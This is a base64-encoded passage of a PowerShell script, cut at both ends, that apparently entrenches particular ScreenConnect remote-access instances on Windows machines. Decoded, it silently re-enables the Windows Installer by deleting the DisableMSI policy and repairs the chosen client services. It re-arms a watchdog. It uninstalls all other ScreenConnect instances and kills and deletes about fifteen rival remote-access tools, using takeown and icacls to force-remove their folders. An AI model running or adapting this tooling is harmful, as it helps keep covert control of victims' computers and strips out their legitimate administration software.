aWYgKCRudWxsIC1lcSAkYykgew0KICAgICAgICBJbnN0YWxsLVdhdGNoZG9nIHwgT3V0LU51bGwN
CiAgICAgICAgcmV0dXJuICdSRUFSTUVEJw0KICAgIH0NCiAgICByZXR1cm4gJ09LJw0KfQ0KDQpm
dW5jdGlvbiBSZXBhaXItU0NTZXJ2aWNlKFtzdHJpbmddJEZpbmdlcnByaW50KSB7DQogICAgIyBS
ZWNyZWF0ZXMgYSBkZWxldGVkIFNDIHNlcnZpY2UgZW50cnkgYnkgcmVwYWlyaW5nIHRoZSBSRUdJ
U1RFUkVEIHByb2R1Y3QuDQogICAgIyBtc2lleGVjIC9mYSB7R1VJRH0gcmVwYWlycyBpbiBwbGFj
ZSAtIGl0IGRvZXMgTk9UIHJ1biB0aGUgU0MtZmFtaWx5DQogICAgIyBtYWpvci11cGdyYWRlIHJl
bW92YWwsIHNvIG90aGVyIGluc3RhbmNlcyBhcmUgdW50b3VjaGVkLg0KICAgIGlmICgtbm90ICRG
aW5nZXJwcmludCkgeyByZXR1cm4gJ25vLWZwJyB9DQogICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVj
dCBDbGllbnQgKCRGaW5nZXJwcmludCkiDQogICAgaWYgKEdldC1TZXJ2aWNlIC1OYW1lICRuYW1l
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSB7IHJldHVybiAnc3ZjLXByZXNlbnQnIH0N
CiAgICAkZ3VpZCA9ICRudWxsDQogICAgZm9yZWFjaCAoJHJvb3QgaW4gJ0hLTE06XFNPRlRXQVJF
XE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbCcsDQogICAgICAgICAg
ICAgICAgICAgICAgJ0hLTE06XFNPRlRXQVJFXFdPVzY0MzJOb2RlXEN1cnJlbnRWZXJzaW9uXFVu
aW5zdGFsbCcpIHsNCiAgICAgICAgR2V0LUNoaWxkSXRlbSAkcm9vdCAtRXJyb3JBY3Rpb24gU2ls
ZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgICRkbiA9IChHZXQt
SXRlbVByb3BlcnR5ICRfLlBTUGF0aCkuRGlzcGxheU5hbWUNCiAgICAgICAgICAgIGlmICgkZG4g
LWFuZCAkZG4gLWxpa2UgIiokbmFtZSoiIC1hbmQgJF8uUFNDaGlsZE5hbWUgLWxpa2UgJ3sqfScp
IHsgJGd1aWQgPSAkXy5QU0NoaWxkTmFtZSB9DQogICAgICAgIH0NCiAgICB9DQogICAgaWYgKC1u
b3QgJGd1aWQpIHsgcmV0dXJuICdub3QtcmVnaXN0ZXJlZCcgfQ0KICAgICYgcmVnLmV4ZSBkZWxl
dGUgJ0hLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyJyAv
diBEaXNhYmxlTVNJIC9mIDI+JjEgfCBPdXQtTnVsbA0KICAgICYgcmVnLmV4ZSBhZGQgJ0hLTE1c
U09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyJyAvdiBEaXNhYmxl
TVNJIC90IFJFR19EV09SRCAvZCAwIC9mIDI+JjEgfCBPdXQtTnVsbA0KICAgICRsb2cgPSBKb2lu
LVBhdGggJFdvcmtEaXIgIm1zaV9yZXBhaXJfJEZpbmdlcnByaW50LmxvZyINCiAgICAkcCA9IFN0
YXJ0LVByb2Nlc3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAiL2ZhICRndWlkIC9xbiAvbm9y
ZXN0YXJ0IC9MKnYgYCIkbG9nYCIiIC1XYWl0IC1QYXNzVGhydQ0KICAgIFN0YXJ0LVNsZWVwIC1T
ZWNvbmRzIDgNCiAgICBpZiAoR2V0LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0aW9uIFNp
bGVudGx5Q29udGludWUpIHsgcmV0dXJuICJzdmMtcmVzdG9yZWQgZXhpdD0kKCRwLkV4aXRDb2Rl
KSIgfQ0KICAgIHJldHVybiAic3ZjLXN0aWxsLW1pc3NpbmcgZXhpdD0kKCRwLkV4aXRDb2RlKSIN
Cn0NCg0KZnVuY3Rpb24gSW52b2tlLUV4dGVybWluYXRlIHsNCiAgICAjIFRydWUgcmVtb3ZhbCBv
ZiBldmVyeXRoaW5nIHJlbW90ZS1hY2Nlc3MgZXhjZXB0IHRoZSB0d28gYWxsb3dsaXN0ZWQNCiAg
ICAjIFNjcmVlbkNvbm5lY3QgaW5zdGFuY2VzLiBPcmRlciBtYXR0ZXJzOiBwcm9kdWN0cyBmaXJz
dCAoY2xlYW4gTVNJDQogICAgIyB1bmluc3RhbGwpLCB0aGVuIHNlcnZpY2VzLCBwcm9jZXNzZXMs
IGFuZCBsZWZ0b3ZlciBkaXJzLg0KICAgICRsb2cgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2V4dGVy
bWluYXRlLmxvZycNCiAgICAka2VlcCA9IEAoJzVmNjAxMDU3OTg1MmU1MDcnLCdmODYxYzgxNDBk
NDUzNDI3JykNCiAgICAkbiA9IEB7IHN2YyA9IDA7IHByb2MgPSAwOyBkaXIgPSAwOyBwcm9kdWN0
ID0gMDsgcm1tID0gMCB9DQogICAgZnVuY3Rpb24gTG9nKFtzdHJpbmddJG0pIHsgQWRkLUNvbnRl
bnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICgiezB9IHsxfSIgLWYgKEdldC1EYXRlIC1Gb3Jt
YXQgJ3l5eXktTU0tZGQgSEg6bW06c3MnKSwgJG0pIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
bnVlIH0NCiAgICBmdW5jdGlvbiBJcy1LZWVwZXIoW3N0cmluZ10kcykgeyBmb3JlYWNoICgkayBp
biAka2VlcCkgeyBpZiAoJHMgLWxpa2UgIiokayoiKSB7IHJldHVybiAkdHJ1ZSB9IH07IHJldHVy
biAkZmFsc2UgfQ0KDQogICAgIyAxLiBmb3JlaWduIFNDIHByb2R1Y3RzOiB0cnVlIE1TSSB1bmlu
c3RhbGwgKHN0b3BzL3JlbW92ZXMgY2xlYW5seSkNCiAgICBmb3JlYWNoICgkcm9vdCBpbiAnSEtM
TTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsJywN
CiAgICAgICAgICAgICAgICAgICAgICAnSEtMTTpcU09GVFdBUkVcV09XNjQzMk5vZGVcQ3VycmVu
dFZlcnNpb25cVW5pbnN0YWxsJykgew0KICAgICAgICBHZXQtQ2hpbGRJdGVtICRyb290IC1FcnJv
ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAgICAg
JGRuID0gKEdldC1JdGVtUHJvcGVydHkgJF8uUFNQYXRoKS5EaXNwbGF5TmFtZQ0KICAgICAgICAg
ICAgaWYgKCRkbiAtYW5kICRkbiAtbWF0Y2ggJ1NjcmVlbkNvbm5lY3QgQ2xpZW50IFwoKFswLTlh
LWZdezE2fSlcKScgLWFuZCAtbm90IChJcy1LZWVwZXIgJGRuKSAtYW5kICRfLlBTQ2hpbGROYW1l
IC1saWtlICd7Kn0nKSB7DQogICAgICAgICAgICAgICAgJHAgPSBTdGFydC1Qcm9jZXNzIG1zaWV4
ZWMuZXhlIC1Bcmd1bWVudExpc3QgIi94ICQoJF8uUFNDaGlsZE5hbWUpIC9xbiAvbm9yZXN0YXJ0
IiAtV2FpdCAtUGFzc1RocnUNCiAgICAgICAgICAgICAgICAkbi5wcm9kdWN0Kys7IExvZyAicHJv
ZHVjdF91bmluc3RhbGxlZCBbJGRuXSBleGl0PSQoJHAuRXhpdENvZGUpIg0KICAgICAgICAgICAg
fQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgIyAyLiBmb3JlaWduIFNDIHNlcnZpY2VzIChsZWZ0
b3ZlciBlbnRyaWVzIGFmdGVyIHVuaW5zdGFsbCwgb3IgdW5yZWdpc3RlcmVkKQ0KICAgIGZvcmVh
Y2ggKCRzdmMgaW4gKEdldC1TZXJ2aWNlIC1OYW1lICdTY3JlZW5Db25uZWN0IENsaWVudConIC1F
cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSkgew0KICAgICAgICBpZiAoLW5vdCAoSXMtS2Vl
cGVyICRzdmMuTmFtZSkpIHsNCiAgICAgICAgICAgICYgc2MuZXhlIHN0b3AgIiQoJHN2Yy5OYW1l
KSIgMj4mMSB8IE91dC1OdWxsDQogICAgICAgICAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRz
IDgwMA0KICAgICAgICAgICAgJiBzYy5leGUgZGVsZXRlICIkKCRzdmMuTmFtZSkiIDI+JjEgfCBP
dXQtTnVsbA0KICAgICAgICAgICAgJG4uc3ZjKys7IExvZyAic3ZjX2RlbGV0ZWQgJCgkc3ZjLk5h
bWUpIg0KICAgICAgICB9DQogICAgfQ0KDQogICAgIyAzLiBmb3JlaWduIFNDIHByb2Nlc3NlcyBi
eSBleGVjdXRhYmxlIHBhdGgNCiAgICBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfUHJvY2VzcyAtRmls
dGVyICJOYW1lIGxpa2UgJ1NjcmVlbkNvbm5lY3QlJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
dGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICRleGUgPSAkXy5FeGVjdXRhYmxlUGF0
aA0KICAgICAgICBpZiAoJGV4ZSAtYW5kIC1ub3QgKElzLUtlZXBlciAkZXhlKSkgew0KICAgICAg
ICAgICAgU3RvcC1Qcm9jZXNzIC1JZCAkXy5Qcm9jZXNzSWQgLUZvcmNlIC1FcnJvckFjdGlvbiBT
aWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICAkbi5wcm9jKys7IExvZyAicHJvY19raWxsZWQg
JGV4ZSINCiAgICAgICAgfQ0KICAgIH0NCg0KICAgICMgNC4gZm9yZWlnbiBTQyBpbnN0YWxsIGRp
cnMNCiAgICBmb3JlYWNoICgkYmFzZSBpbiBAKCRlbnY6UHJvZ3JhbUZpbGVzLCAke2VudjpQcm9n
cmFtRmlsZXMoeDg2KX0pKSB7DQogICAgICAgIGlmICgtbm90ICRiYXNlIC1vciAtbm90IChUZXN0
LVBhdGggJGJhc2UpKSB7IGNvbnRpbnVlIH0NCiAgICAgICAgR2V0LUNoaWxkSXRlbSAtTGl0ZXJh
bFBhdGggJGJhc2UgLURpcmVjdG9yeSAtRmlsdGVyICdTY3JlZW5Db25uZWN0KicgLUVycm9yQWN0
aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAkZCA9
ICRfLkZ1bGxOYW1lDQogICAgICAgICAgICBpZiAoLW5vdCAoSXMtS2VlcGVyICRkKSkgew0KICAg
ICAgICAgICAgICAgIEdldC1DaW1JbnN0YW5jZSBXaW4zMl9Qcm9jZXNzIC1GaWx0ZXIgIk5hbWUg
bGlrZSAnU2NyZWVuQ29ubmVjdCUnIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQog
ICAgICAgICAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkV4ZWN1dGFibGVQYXRoIC1saWtl
ICIkZCoiIH0gfA0KICAgICAgICAgICAgICAgICAgICBGb3JFYWNoLU9iamVjdCB7IFN0b3AtUHJv
Y2VzcyAtSWQgJF8uUHJvY2Vzc0lkIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
ZSB9DQogICAgICAgICAgICAgICAgJiB0YWtlb3duLmV4ZSAvRiAkZCAvUiAvRCBZIDI+JjEgfCBP
dXQtTnVsbA0KICAgICAgICAgICAgICAgICYgaWNhY2xzLmV4ZSAkZCAvZ3JhbnQgJ0FkbWluaXN0
cmF0b3JzOkYnIC9UIC9DIDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICAgICAgICAgIFJlbW92ZS1J
dGVtIC1MaXRlcmFsUGF0aCAkZCAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUNCiAgICAgICAgICAgICAgICBpZiAoVGVzdC1QYXRoICRkKSB7IFN0YXJ0LVNsZWVw
IC1TZWNvbmRzIDI7IFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkZCAtUmVjdXJzZSAtRm9yY2Ug
LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfQ0KICAgICAgICAgICAgICAgIGlmIChUZXN0
LVBhdGggJGQpIHsgTG9nICJkaXJfUkVNT1ZFX0ZBSUxFRCAkZCIgfSBlbHNlIHsgJG4uZGlyKys7
IExvZyAiZGlyX3JlbW92ZWQgJGQiIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0N
Cg0KICAgICMgNS4gZGlzYWxsb3dlZCBSTU0gdG9vbHM6IHByb2R1Y3RzLCBzZXJ2aWNlcywgcHJv
Y2Vzc2VzLCBkaXJzDQogICAgJHJtbSA9IEAoDQogICAgICAgIEB7IFRhZz0nQW55RGVzayc7ICAg
ICBTdmM9QCgnQW55RGVzaycpOyBQcm9jPUAoJ0FueURlc2snKTsgRGlycz1AKCIkZW52OlByb2dy
YW1GaWxlc1xBbnlEZXNrIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFueURlc2siLCIkZW52
OlByb2dyYW1EYXRhXEFueURlc2siKTsgUHJvZD1AKCdBbnlEZXNrKicpIH0NCiAgICAgICAgQHsg
VGFnPSdUZWFtVmlld2VyJzsgIFN2Yz1AKCdUZWFtVmlld2VyKicpOyBQcm9jPUAoJ1RlYW1WaWV3
ZXIqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcVGVhbVZpZXdlciIsIiR7ZW52OlByb2dy
YW1GaWxlcyh4ODYpfVxUZWFtVmlld2VyIik7IFByb2Q9QCgnVGVhbVZpZXdlcionKSB9DQogICAg
ICAgIEB7IFRhZz0nTWVzaEFnZW50JzsgICBTdmM9QCgnTWVzaCBBZ2VudCcsJ01lc2hBZ2VudCcs
J01lc2hDZW50cmFsKicpOyBQcm9jPUAoJ01lc2hBZ2VudConLCdNZXNoQ2VudHJhbConKTsgRGly
cz1AKCIkZW52OlByb2dyYW1GaWxlc1xNZXNoIEFnZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
Nil9XE1lc2ggQWdlbnQiKTsgUHJvZD1AKCdNZXNoKkFnZW50KicpIH0NCiAgICAgICAgQHsgVGFn
PSdTcGxhc2h0b3AnOyAgIFN2Yz1AKCdTcGxhc2h0b3AqJywnU1JTZXJ2aWNlJywnU1NVU2Vydmlj
ZScpOyBQcm9jPUAoJ1NwbGFzaHRvcConLCdzdHJ3aW5jbHQqJywnU1JNYW5hZ2VyKicpOyBEaXJz
PUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFNwbGFzaHRvcCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYp
fVxTcGxhc2h0b3AiKTsgUHJvZD1AKCdTcGxhc2h0b3AqJykgfQ0KICAgICAgICBAeyBUYWc9J0xv
Z01lSW4nOyAgICAgU3ZjPUAoJ0xvZ01lSW4nLCdMTUlHdWFyZGlhblN2YycsJ0xNSWlnbml0aW9u
Jyk7IFByb2M9QCgnTG9nTWVJbionLCdMTUlHdWFyZGlhbionLCdSYVNlcnZlcionKTsgRGlycz1A
KCIkZW52OlByb2dyYW1GaWxlc1xMb2dNZUluIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XExv
Z01lSW4iKTsgUHJvZD1AKCdMb2dNZUluKicpIH0NCiAgICAgICAgQHsgVGFnPSdHb1RvJzsgICAg
ICAgIFN2Yz1AKCdHb1RvTXlQQyonLCdHb1RvQXNzaXN0KicsJ0dvVG9SZXNvbHZlKicpOyBQcm9j
PUAoJ0dvVG9NeVBDKicsJ0dvVG9Bc3Npc3QqJywnZzJtKicsJ0dvVG9SZXNvbHZlKicpOyBEaXJz
PUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEdvVG9NeVBDIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9
XEdvVG9NeVBDIiwiJGVudjpQcm9ncmFtRmlsZXNcR29Ub0Fzc2lzdCoiLCIke2VudjpQcm9ncmFt
RmlsZXMoeDg2KX1cR29Ub0Fzc2lzdCoiKTsgUHJvZD1AKCdHb1RvTXlQQyonLCdHb1RvQXNzaXN0
KicpIH0NCiAgICAgICAgQHsgVGFnPSdDb25uZWN0V2lzZSc7IFN2Yz1AKCdMVFNlcnZpY2UnLCdM
VFN2Y01vbicpOyBQcm9jPUAoJ0xUU3ZjKicsJ0xUVHJheSonKTsgRGlycz1AKCIkZW52OndpbmRp
clxMVFN2YyIpOyBQcm9kPUAoJ0Nvbm5lY3RXaXNlKicsJ0xhYlRlY2gqJykgfQ0KICAgICAgICBA
eyBUYWc9J0F0ZXJhJzsgICAgICAgU3ZjPUAoJ0F0ZXJhQWdlbnQnKTsgUHJvYz1AKCdBdGVyYUFn
ZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFURVJBIE5ldHdvcmtzIiwiJHtlbnY6
UHJvZ3JhbUZpbGVzKHg4Nil9XEFURVJBIE5ldHdvcmtzIik7IFByb2Q9QCgnQXRlcmEqJykgfQ0K
ICAgICAgICBAeyBUYWc9J05pbmphUk1NJzsgICAgU3ZjPUAoJ05pbmphUk1NQWdlbnQnLCduaW5q
YXJtbSonKTsgUHJvYz1AKCdOaW5qYVJNTUFnZW50KicsJ25pbmphcm1tKicpOyBEaXJzPUAoIiRl
bnY6UHJvZ3JhbUZpbGVzXE5pbmphUk1NQWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
TmluamFSTU1BZ2VudCIsIiRlbnY6UHJvZ3JhbURhdGFcTmluamFSTU1BZ2VudCIpOyBQcm9kPUAo
J05pbmphUk1NKicpIH0NCiAgICAgICAgQHsgVGFnPSdEYXR0byc7ICAgICAgIFN2Yz1AKCdDZW50
cmFTdGFnZScsJ0NhZ1NlcnZpY2UnKTsgUHJvYz1AKCdDZW50cmFTdGFnZSonLCdEYXR0b1JNTSon
KTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xDZW50cmFTdGFnZSIsIiR7ZW52OlByb2dyYW1G
aWxlcyh4ODYpfVxDZW50cmFTdGFnZSIpOyBQcm9kPUAoJ0RhdHRvKicsJ0NlbnRyYVN0YWdlKicp
IH0NCiAgICAgICAgQHsgVGFnPSdSdXN0RGVzayc7ICAgIFN2Yz1AKCdSdXN0RGVzaycsJ3J1c3Rk
ZXNrKicpOyBQcm9jPUAoJ3J1c3RkZXNrKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFJ1
c3REZXNrIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFJ1c3REZXNrIiwiJGVudjpBUFBEQVRB
XFJ1c3REZXNrIik7IFByb2Q9QCgnUnVzdERlc2sqJykgfQ0KICAgICAgICBAeyBUYWc9J1N1cHJl
bW8nOyAgICAgU3ZjPUAoJ1N1cHJlbW8qJyk7IFByb2M9QCgnU3VwcmVtbyonKTsgRGlycz1AKCIk
ZW52OlByb2dyYW1GaWxlc1xTdXByZW1vIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFN1cHJl
bW8iKTsgUHJvZD1AKCdTdXByZW1vKicpIH0NCiAgICAgICAgQHsgVGFnPSdEV1NlcnZpY2UnOyAg
IFN2Yz1AKCdEV0FnZW50JywnZHdhZ2VudConKTsgUHJvYz1AKCdkd2FnZW50KicpOyBEaXJzPUAo
IiRlbnY6UHJvZ3JhbUZpbGVzXERXQWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cRFdB
Z2VudCIsIiRlbnY6UHJvZ3JhbURhdGFcRFdBZ2VudCIpOyBQcm9kPUAoJ0RXQWdlbnQqJykgfQ0K
ICAgICAgICBAeyBUYWc9J1pvaG9Bc3Npc3QnOyAgU3ZjPUAoJ1pvaG9Bc3Npc3QqJywnWm9ob01l
ZXRpbmcqJyk7IFByb2M9QCgnWm9ob0Fzc2lzdConLCdab2hvVVJTQionKTsgRGlycz1AKCIkZW52
OlByb2dyYW1GaWxlc1xab2hvTWVldGluZyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxab2hv
TWVldGluZyIpOyBQcm9kPUAoJ1pvaG8gQXNzaXN0KicpIH0NCiAgICAgICAgQHsgVGFnPSdSZW1v
dGVQQyc7ICAgIFN2Yz1AKCdSZW1vdGVQQyonKTsgUHJvYz1AKCdSZW1vdGVQQyonLCdSUENTdWl0
ZSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xSZW1vdGVQQyIsIiR7ZW52OlByb2dyYW1G
aWxlcyh4ODYpfVxSZW1vdGVQQyIpOyBQcm9kPUAoJ1JlbW90ZVBDKicpIH0NCiAgICApDQogICAg
Zm9yZWFjaCAoJHRvb2wgaW4gJHJtbSkgew0KICAgICAgICAkaGl0ID0gJGZhbHNlDQogICAgICAg
IGZvcmVhY2ggKCRwYXQgaW4gJHRvb2wuUHJvZCkgew0KICAgICAgICAgICAgZm9yZWFjaCAoJHJv
b3QgaW4gJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVu
aW5zdGFsbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnSEtMTTpcU09GVFdBUkVc
V09XNjQzMk5vZGVcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsJykgew0KICAgICAgICAgICAgICAg
IEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JF
YWNoLU9iamVjdCB7DQogICAgICAgICAgICAgICAgICAgICRkbiA9IChHZXQtSXRlbVByb3BlcnR5
ICRfLlBTUGF0aCkuRGlzcGxheU5hbWUNCiAgICAgICAgICAgICAgICAgICAgaWYgKCRkbiAtYW5k
ICRkbiAtbGlrZSAkcGF0IC1hbmQgJF8uUFNDaGlsZE5hbWUgLWxpa2UgJ3sqfScpIHsNCiAgICAg
ICAgICAgICAgICAgICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJndW1l
bnRMaXN0ICIveCAkKCRfLlBTQ2hpbGROYW1lKSAvcW4gL25vcmVzdGFydCIgLVdhaXQgLVBhc3NU
aHJ1DQogICAgICAgICAgICAgICAgICAgICAgICAkbi5ybW0rKzsgJGhpdCA9ICR0cnVlOyBMb2cg
InJtbV9wcm9kdWN0X3VuaW5zdGFsbGVkIFskZG5dIGV4aXQ9JCgkcC5FeGl0Q29kZSkiDQogICAg
ICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAg
ICAgIH0NCiAgICAgICAgZm9yZWFjaCAoJHBhdCBpbiAkdG9vbC5TdmMpIHsNCiAgICAgICAgICAg
IEdldC1TZXJ2aWNlIC1OYW1lICRwYXQgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBG
b3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAgICAgJiBzYy5leGUgc3RvcCAiJCgkXy5OYW1l
KSIgMj4mMSB8IE91dC1OdWxsDQogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vj
b25kcyA4MDANCiAgICAgICAgICAgICAgICAmIHNjLmV4ZSBkZWxldGUgIiQoJF8uTmFtZSkiIDI+
JjEgfCBPdXQtTnVsbA0KICAgICAgICAgICAgICAgICRuLnJtbSsrOyAkaGl0ID0gJHRydWU7IExv
ZyAicm1tX3N2Y19kZWxldGVkICQoJF8uTmFtZSkgWyQoJHRvb2wuVGFnKV0iDQogICAgICAgICAg
ICB9DQogICAgICAgIH0NCiAgICAgICAgZm9yZWFjaCAoJHBhdCBpbiAkdG9vbC5Qcm9jKSB7DQog
ICAgICAgICAgICBHZXQtUHJvY2VzcyAtTmFtZSAkcGF0IC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
bnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAgICAgICAgIFN0b3AtUHJvY2VzcyAt
SWQgJF8uSWQgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAg
ICAgICAgJG4ucm1tKys7ICRoaXQgPSAkdHJ1ZTsgTG9nICJybW1fcHJvY19raWxsZWQgJCgkXy5Q
cm9jZXNzTmFtZSkgWyQoJHRvb2wuVGFnKV0iDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAg
ICAgICAgZm9yZWFjaCAoJGQgaW4gJHRvb2wuRGlycykgew0KICAgICAgICAgICAgaWYgKCRkIC1h
bmQgKFRlc3QtUGF0aCAkZCkpIHsNCiAgICAgICAgICAgICAgICBHZXQtQ2ltSW5zdGFuY2UgV2lu
MzJfUHJvY2VzcyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAgICAgICAg
ICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkV4ZWN1dGFibGVQYXRoIC1hbmQgJF8uRXhlY3V0YWJs
ZVBhdGguU3RhcnRzV2l0aCgkZCkgfSB8DQogICAgICAgICAgICAgICAgICAgIEZvckVhY2gtT2Jq
ZWN0IHsgU3RvcC1Qcm9jZXNzIC1JZCAkXy5Qcm9jZXNzSWQgLUZvcmNlIC1FcnJvckFjdGlvbiBT
aWxlbnRseUNvbnRpbnVlIH0NCiAgICAgICAgICAgICAgICAmIHRha2Vvd24uZXhlIC9GICRkIC9S
IC9EIFkgMj4mMSB8IE91dC1OdWxsDQogICAgICAgICAgICAgICAgJiBpY2FjbHMuZXhlICRkIC9n
cmFudCAnQWRtaW5pc3RyYXRvcnM6RicgL1QgL0MgMj4mMSB8IE91dC1OdWxsDQogICAgICAgICAg
ICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRkIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICAgICAgICAgIGlmIChUZXN0LVBhdGggJGQp
IHsgU3RhcnQtU2xlZXAgLVNlY29uZHMgMjsgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRkIC1S
ZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB9DQogICAgICAgICAg
ICAgICAgaWYgKFRlc3QtUGF0aCAkZCkgeyBMb2cgInJtbV9kaXJfUkVNT1ZFX0ZBSUxFRCAkZCIg
fSBlbHNlIHsgJG4ucm1tKys7ICRoaXQgPSAkdHJ1ZTsgTG9nICJybW1fZGlyX3JlbW92ZWQgJGQi
IH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBpZiAoJGhpdCkgeyBMb2cgInJt
bV9leHRlcm1pbmF0ZWQgJCgkdG9vbC5UYWcpIiB9DQogICAgfQ0KDQogICAgcmV0dXJuICJleHRl
cm1pbmF0ZSBzdmM9JCgkbi5zdmMpIHByb2M9JCgkbi5wcm9jKSBkaXI9JCgkbi5kaXIpIHByb2R1
Y3Q9JCgkbi5wcm9kdWN0KSBybW09JCgkbi5ybW0pIg0KfQ0KDQpmdW5jdGlvbiBVcGRhdGUtU3Rh
dGUgew0KICAgICRwcmltID0gJG51bGw7ICRhbHQgPSAkbnVsbA0KICAgIGZvcmVhY2ggKCRzdmMg
aW4gKEdldC1TZXJ2aWNlIC1OYW1lICdTY3JlZW5Db25uZWN0IENsaWVudConKSkgew0KICAgICAg
ICBpZiAoJHN2Yy5OYW1lIC1tYXRjaCAnXCgoWzAtOWEtZl17MTZ9KVwpJykgew0KICAgICAgICAg
ICAgaWYgKCRtYXRjaGVzWzFdIC1lcSAnNWY2MDEwNTc5ODUyZTUwNycpIHsgJHByaW0gPSAiJCgk
c3ZjLlN0YXR1cykiIH0NCiAgICAgICAgICAgIGVsc2VpZiAoJG1hdGNoZXNbMV0gLWVxICdmODYx
YzgxNDBkNDUzNDI3JykgeyAkYWx0ID0gIiQoJHN2Yy5TdGF0dXMpIiB9DQogICAgICAgIH0NCiAg
ICB9DQogICAgJGZvcmVpZ24gPSBAKCkNCiAgICBmb3JlYWNoICgkc3ZjIGluIChHZXQtU2Vydmlj
ZSAtTmFtZSAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJykpIHsNCiAgICAgICAgaWYgKCRzdmMuTmFt
ZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2fSlcKScgLWFuZCAkbWF0Y2hlc1sxXSAtbm90aW4gQCgn
NWY2MDEwNTc5ODUyZTUwNycsJ2Y4NjFjODE0MGQ0NTM0MjcnKSkgew0KICAgICAgICAgICAgJGZv
cmVpZ24gKz0gJG1hdGNoZXNbMV0NCiAgICAgICAgfQ0KICAgIH0NCiAgICAkaWQgPSBSZWFkLUlk
ZW50aXR5DQogICAgJHRhc2tzT2sgPSAwOyAkdGFza3NUb3RhbCA9IDANCiAgICBmb3JlYWNoICgk
ayBpbiAnVEFTS19BJywnVEFTS19CJywnVEFTS19DJywnVEFTS19EJykgew0KICAgICAgICAkdGFz
